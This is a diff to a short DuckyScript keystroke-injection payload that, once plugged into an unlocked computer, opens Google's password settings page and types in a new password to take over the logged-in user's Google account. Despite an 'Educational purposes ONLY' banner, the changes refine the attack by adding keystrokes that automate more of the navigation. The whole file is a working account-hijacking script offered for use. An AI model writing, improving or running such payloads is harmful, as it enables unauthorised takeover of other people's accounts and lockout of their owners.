@@ -1,7 +1,5 @@
 REM Educational purposes ONLY!!!
 
-REM Before running code go to myaccount.google.com/signinoptions/password and than click forgot password than run script
-
 REM Simple script that changes users google acc password
 
 REM Change where it says new password here with the password you want it to be, make sure they are the exact same for both.
@@ -12,8 +10,15 @@ DEFAULT_DELAY 1000
 ALT F4
 CTRL t
 STRING myaccount.google.com/signinoptions/password
+F11
+TAB
+REPEAT 4
 ENTER
-DELAY 3000
+CTRL w
+CTRL t
+STRING myaccount.google.com/signinoptions/password
+ENTER
+DELAY 2000
 STRING NEW PASSWORD HERE
 TAB
 REPEAT 2
